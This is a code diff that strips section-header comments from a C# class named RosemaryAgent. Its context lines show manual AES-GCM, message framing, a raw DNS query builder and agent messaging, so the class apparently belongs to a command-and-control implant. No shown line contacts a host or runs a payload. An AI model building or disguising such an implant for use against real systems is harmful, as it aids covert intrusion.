@@ -99,7 +99,7 @@ public class RosemaryAgent {
     }
     RosemaryAgent(byte[] key) { _key = (byte[])key.Clone(); }
 
-    // ── AES-GCM (manual, .NET Framework compatible) ───────────────────────────
+   
 
     static byte[] AesBlock(byte[] key, byte[] block) {
         using (var aes = Aes.Create()) {
@@ -203,7 +203,7 @@ public class RosemaryAgent {
         return GcmCtr(_key, nonce, ciphertext);
     }
 
-    // ── Compression ───────────────────────────────────────────────────────────
+    
 
     byte[] Deflate(byte[] d) {
         var ms = new MemoryStream();
@@ -217,7 +217,7 @@ public class RosemaryAgent {
         }
     }
 
-    // ── Framing ───────────────────────────────────────────────────────────────
+    
 
     byte[] Hdr(byte cmd, uint id, ushort len) {
         return new byte[] {
@@ -226,7 +226,7 @@ public class RosemaryAgent {
         };
     }
 
-    // ── JSON helpers (no external library) ───────────────────────────────────
+    
 
     static string JStr(string json, string key, string def) {
         var m = Regex.Match(json, "\"" + Regex.Escape(key) + "\"\\s*:\\s*\"((?:[^\"\\\\]|\\\\.)*)\"");
@@ -295,7 +295,7 @@ public class RosemaryAgent {
         return json.Substring(start, end - start);
     }
 
-    // ── Misc helpers ──────────────────────────────────────────────────────────
+    
 
     string JE(string s) {
         if (s == null) return "";
@@ -360,7 +360,7 @@ public class RosemaryAgent {
         return seen.ToList();
     }
 
-    // ── DNS helpers ───────────────────────────────────────────────────────────
+   
 
     byte[] BuildDnsQuery(string domain, ushort qtype) {
         var ms = new MemoryStream();
@@ -409,7 +409,7 @@ public class RosemaryAgent {
         return new List<string>();
     }
 
-    // ── Protocol ──────────────────────────────────────────────────────────────
+    
 
     async Task SendMsg(RmWriteFunc write, string type, string payload, string origId) {
         string orig = origId.Length > 0 ? ",\"original_agent_id\":\"" + origId + "\"" : "";
